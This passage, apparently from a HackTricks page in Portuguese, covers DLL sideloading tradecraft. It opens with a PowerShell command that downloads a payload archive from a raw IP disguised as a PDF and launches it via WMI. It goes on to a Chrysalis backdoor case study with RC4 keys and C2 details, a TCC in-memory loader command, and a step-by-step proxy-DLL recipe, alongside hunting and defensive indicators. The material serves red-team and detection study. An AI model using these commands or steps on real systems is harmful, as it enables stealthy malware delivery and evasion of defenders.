$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirects; `tar -xf` usa o tar integrado do Windows.

- **WMI/CIM launch:** Inicie o EXE via WMI para que a telemetry mostre um processo criado por CIM enquanto ele carrega a DLL colocalizada:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binaries que preferem DLLs locais (por exemplo, `intelbq.exe`, `nearby_share.exe`); o payload (por exemplo, Remcos) roda sob o nome trusted.

- **Hunting:** Dispare alerta em `forfiles` quando `/p`, `/m` e `/c` aparecerem juntos; é incomum fora de scripts administrativos.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uma intrusão recente da Lotus Blossom abusou de uma trusted update chain para entregar um dropper empacotado em NSIS que preparou um DLL sideload e payloads totalmente in-memory.

Tradecraft flow
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca como **HIDDEN**, solta um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, uma malicious `log.dll` e um encrypted blob `BluetoothService`, então inicia o EXE.
- O host EXE importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` faz mmap-load do blob; `LogWrite` o decrypta com um custom stream baseado em LCG (constants **0x19660D** / **0x3C6EF35F**, key material derivado de um hash anterior), sobrescreve o buffer com plaintext shellcode, libera temps e salta para ele.
- Para evitar um IAT, o loader resolve APIs fazendo hash dos export names usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, depois aplica um Murmur-style avalanche (**0x85EBCA6B**) e compara com salted target hashes.

Main shellcode (Chrysalis)
- Decrypta um PE-like main module repetindo add/XOR/sub com a key `gQ2JR&9;` por cinco passes, depois carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para finalizar a import resolution.
- Reconstrói strings de nomes de DLL em runtime via transforms por caractere de bit-rotate/XOR, e então carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um second resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada export table em blocos de 4 bytes com Murmur-style mixing, e só recorre a `GetProcAddress` se o hash não for encontrado.

Embedded configuration & C2
- A config fica dentro do arquivo `BluetoothService` solto em **offset 0x30808** (size **0x980**) e é RC4-decrypted com key `qwhvb^435h&*7`, revelando a C2 URL e o User-Agent.
- Os beacons montam um host profile separado por pontos, adicionam a tag `4Q`, então RC4-encrypt com a key `vAuig34%^325hGV` antes de `HttpSendRequestA` via HTTPS. As responses são RC4-decrypted e despachadas por um tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- O modo de execução é controlado por CLI args: sem args = instala persistence (service/Run key) apontando para `-i`; `-i` relança a si mesmo com `-k`; `-k` pula a instalação e executa o payload.

Alternate loader observed
- A mesma intrusão soltou Tiny C Compiler e executou `svchost.exe -nostdlib -run conf.c` de `C:\ProgramData\USOShared\`, com `libtcc.dll` ao lado. O C source fornecido pelo atacante embutia shellcode, compilava e executava in-memory sem tocar o disco com um PE. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Esta etapa de compile-and-run baseada em TCC importou `Wininet.dll` em tempo de execução e puxou um shellcode de second-stage de uma URL hardcoded, fornecendo um loader flexível que se disfarça como uma execução de compiler.

## Signed-host sideloading com export proxying + host thread parking

Algumas cadeias de DLL sideloading adicionam **stability engineering** para que o host legítimo permaneça vivo tempo suficiente para carregar stages posteriores de forma limpa, em vez de travar depois que a DLL maliciosa é carregada.

Padrão observado
- Solte um EXE confiável ao lado de uma DLL maliciosa usando o nome de dependency esperado, como `version.dll`.
- A DLL maliciosa **proxy todas as expected exports** de volta para a DLL legítima do sistema (por exemplo `%SystemRoot%\\System32\\version.dll`), assim a import resolution continua funcionando e o host process mantém a operação.
- Após o load, a DLL maliciosa **patches o host entry point** para que a main thread caia em um loop infinito de `Sleep` em vez de sair ou executar code paths que encerrariam o process.
- Uma nova thread executa o verdadeiro trabalho malicioso: decrypting o nome ou path da next-stage DLL (RC4/XOR são comuns), e então iniciando-a com `LoadLibrary`.

Por que isso importa
- O proxying normal de DLL preserva a compatibilidade de API, mas não garante que o host permaneça vivo tempo suficiente para stages posteriores.
- Colocar a main thread em `Sleep(INFINITE)` é uma forma simples de manter o signed process residente enquanto o loader executa decryption, staging ou network bootstrap em uma worker thread.
- Procurar apenas por um `DllMain` suspeito pode perder esse padrão se o comportamento interessante acontecer depois que o host entry point é patchado e uma secondary thread inicia.

Fluxo mínimo
1. Copie o signed host EXE e determine qual DLL ele resolve a partir do diretório local.
2. Construa uma proxy DLL exportando as mesmas funções e encaminhando-as para a DLL legítima.
3. Em `DllMain(DLL_PROCESS_ATTACH)`, crie uma worker thread.
4. A partir dessa thread, patch o host entry point ou a rotina de início da main thread para que ela faça loop em `Sleep`.
5. Decrypt a next-stage DLL name/config e chame `LoadLibrary` ou faça manual-map do payload.

Pontos defensivos
- Signed processes carregando `version.dll` ou bibliotecas comuns semelhantes a partir do próprio diretório do application em vez de `System32`.
- Memory patches no process entry point logo após o image load, especialmente jumps/calls redirecionados para `Sleep`/`SleepEx`.
- Threads criadas por uma proxy DLL que imediatamente chamam `LoadLibrary` em uma second DLL com um nome decrypted.
- Full-export proxy DLLs colocadas ao lado de vendor executables dentro de writable staging directories como `ProgramData`, `%TEMP%` ou paths de archive descompactados.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
